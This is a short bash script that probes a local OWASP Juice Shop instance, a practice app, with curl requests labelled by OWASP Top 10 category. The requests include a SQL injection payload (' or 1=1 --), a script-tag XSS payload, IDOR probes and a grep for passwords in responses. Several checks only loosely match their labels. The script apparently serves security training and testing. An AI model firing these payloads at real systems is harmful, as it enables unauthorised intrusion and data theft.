#!/usr/bin/env bash

# Set variables
juice_shop_url="http://localhost:3000"

# Injection
curl "$juice_shop_url/api/products/search?q=%27%20or%201%3D1%20--%20"

# Broken authentication and session management
curl -c cookie.txt "$juice_shop_url/api/Users/login" -H "Content-Type: application/json" --data '{"email":"'$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)'@example.com","password":"password"}'
curl -b cookie.txt "$juice_shop_url/api/Users/$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"

# Cross-site scripting (XSS)
curl "$juice_shop_url/api/feedback?text=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"

# Insecure direct object references
curl "$juice_shop_url/api/BasketItems/$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"

# Security misconfiguration
curl "$juice_shop_url/robots.txt"

# Sensitive data exposure
curl "$juice_shop_url/api/Users/login" -H "Content-Type: application/json" --data '{"email":"'$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)'@example.com","password":"password"}' | grep -oP '(?<="password":")[^"]*'

# Cross-site request forgery (CSRF)
curl "$juice_shop_url/api/feedback?text=test" -H "Content-Type: application/json" -H "Referer: $juice_shop_url/some-other-site"

# Using components with known vulnerabilities
curl "$juice_shop_url/rest/user/demo/2/-1"

# Insufficient logging and monitoring
curl "$juice_shop_url/api/BasketItems"

# Remove cookie file
rm cookie.txt
